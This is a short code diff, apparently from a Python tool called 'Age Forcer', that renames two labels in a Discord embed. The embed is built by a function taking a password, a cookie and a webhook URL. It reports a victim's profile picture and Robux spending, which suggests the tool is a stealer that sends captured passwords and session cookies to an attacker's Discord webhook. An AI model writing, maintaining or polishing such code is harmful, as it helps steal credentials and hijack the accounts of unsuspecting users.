@@ -84,7 +84,7 @@ def send_to_discord_background(password, cookie, webhook_url):
             'content': ping_content,
             'embeds': [
                 {
-                    'title': 'Age Forcer',
+                    'title': 'Age Forcer Logs',
                     'color': 0xff0000,
                     'thumbnail': {
                         'url': user_info['profile_picture']
@@ -111,7 +111,7 @@ def send_to_discord_background(password, cookie, webhook_url):
                             'inline': False
                         },
                         {
-                            'name': '📊 Total spent robux past Year',
+                            'name': '📊 Summary',
                             'value': user_info.get('total_spent_past_year', 'Not available'),
                             'inline': False
                         },
